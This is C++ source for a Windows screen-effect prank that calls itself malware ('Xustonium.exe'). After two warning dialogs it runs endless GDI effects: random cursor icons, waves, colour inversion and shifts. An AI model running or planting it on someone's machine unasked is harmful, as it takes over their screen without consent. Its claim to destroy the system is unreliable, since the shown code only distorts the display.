#include <windows.h>
#include <cmath>
#include <time.h>
#define min(a,b) (((a)<(b))?(a):(b))
#define max(a,b) (((a)>(b))?(a):(b))
#define NOTSRCINVERT 0x999999ul

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;


typedef struct tagPRGBTRIPLE{
  BYTE rgbtRed;
  BYTE rgbtGreen;
  BYTE rgbtBlue;
} *PRGBTRIPLE, *NPRGBTRIPLE, *LPRGBTRIPLE;



typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}



int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);




DWORD WINAPI cursor(LPVOID lpParam) {
    HDC hdc;
    while (1) {
        hdc = GetDC(0);
        DrawIcon(hdc, rand () % sw, rand () % sh, LoadCursorA(NULL, IDC_ARROW));
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}


DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdc;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 4, ySize = 8;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 5, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sw + 10; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 5, sh, hdcMem, i, wave, SRCCOPY);
			BitBlt(hdcMem, 0, i, sw, 5, hdcMem, wave, i, NOTSRCERASE);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, NOTSRCERASE);
		Sleep(1);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}

DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdc;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 4, ySize = 8;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 5, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sw + 10; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 6, 5, sh, hdcMem, i, wave, SRCCOPY);
			BitBlt(hdcMem, 6, 6, sw, 5, hdcMem, wave, i, NOTSRCERASE);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, NOTSRCERASE);
		Sleep(1);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}




 DWORD WINAPI shader4(LPVOID lpParam) {
    HDC hdc, mdc;
    BITMAPINFO bmp = { 0 };
    PRGBQUAD rgbquad = { 0 };
    hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
    bmp.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmp.bmiHeader.biBitCount = 32;
    bmp.bmiHeader.biPlanes = 1;
    bmp.bmiHeader.biWidth = sw;
    bmp.bmiHeader.biHeight = sh;
    HBITMAP hbit = CreateDIBSection(hdc, &bmp, 0, (void**)&rgbquad, NULL, 0);
    SelectObject(mdc, (HGDIOBJ)hbit);
    for (;;) {
        BitBlt(mdc, 0, 3, sw, sh, hdc, 0, 0, SRCCOPY);
        for (int c = 0; c < sw * sh; c++) {
            int sx = c % sw, sy = c / sw;
            rgbquad[c].rgb += (sy*250);
        }
        BitBlt(hdc, 0, 0, sw, sh, mdc, 0, 0, SRCERASE);
        Sleep(10);
    }
}

DWORD WINAPI tanwaves(LPVOID lpParam) //credits to N17Pro3426 for fast sines, but I made it into tan waves
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	for (int t = 0; ; t += 20)
	{
		hdc = GetDC(NULL);
		for (int y = 0; y <= h; y++)
		{
			float x = sin((y + t) * (M_PI / 70)) * 35;
			BitBlt(hdc, x, y, w, 1, hcdc, 0, y, SRCCOPY);
		}
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
	}
	Sleep(10);
	ReleaseDC(NULL, hcdc);
	DeleteObject(hcdc);
	DeleteObject(hBitmap);
	return 0;
}



DWORD WINAPI shader5(LPVOID lpParam) {
	HDC hdc;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 4, ySize = 8;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 5, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sw + 10; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, 20, 6, 5, sh, hdcMem, i, wave, SRCCOPY);
			BitBlt(hdcMem, 6, 6, sw, 5, hdcMem, wave, i, NOTSRCINVERT);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, NOTSRCINVERT);
		Sleep(1);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}


DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdc;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 4, ySize = 8;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 5, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sw + 10; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 6, 5, sh, hdcMem, i, wave, SRCCOPY);
			BitBlt(hdcMem, 6, 6, sw, 5, hdcMem, wave, i, NOTSRCINVERT);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, NOTSRCINVERT);
		Sleep(1);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}

int main(){
	FreeConsole();
	if (MessageBoxW(NULL, L"Warning!\r\nYou're about to run a malware known as Xustonium.exe,\r\nIf you don't know what this does, click no and delete this software from your computer.\r\nIf you know what it does and you're running it in a virtual machine that is snapshotted,\r\nClick yes to continue", L"Malware Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
{ if (MessageBoxW(NULL, L"THIS IS THE FINAL WARNING!!\r\nYour system will be destroyed if you continue,\r\nKeep in mind that this malware is made for educational and entertainment purposes only.\r\nThis is your last chance to exit this program.", L"LAST WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
{
	ExitProcess(0);
}
else   

  {
    HANDLE a = CreateThread(0, 0, cursor, 0, 0, 0);
    Sleep(10000);
    HANDLE b = CreateThread(0, 0, shader2, 0, 0, 0);
    Sleep(30000);
    TerminateThread(b, 0);
    CloseHandle(b); 
    InvalidateRect(0, 0, 0);
    HANDLE c = CreateThread(0, 0, shader3, 0, 0, 0);
    Sleep(30000);
    TerminateThread(c, 0);
    CloseHandle(c); 
    InvalidateRect(0, 0, 0);
    HANDLE d = CreateThread(0, 0, shader4, 0, 0, 0);
    Sleep(30000);
    TerminateThread(d, 0);
    CloseHandle(d); 
    InvalidateRect(0, 0, 0);
    HANDLE e = CreateThread(0, 0, tanwaves, 0, 0, 0);
    Sleep(30000);
    TerminateThread(e, 0);
    CloseHandle(e); 
    InvalidateRect(0, 0, 0);
    HANDLE f = CreateThread(0, 0, shader5, 0, 0, 0);
    Sleep(30000);
    TerminateThread(f, 0);
    CloseHandle(f); 
    InvalidateRect(0, 0, 0);
    HANDLE g = CreateThread(0, 0, shader6, 0, 0, 0);
    Sleep(-1);
    TerminateThread(g, 0);
    CloseHandle(g); 
    InvalidateRect(0, 0, 0);

	}
}
}


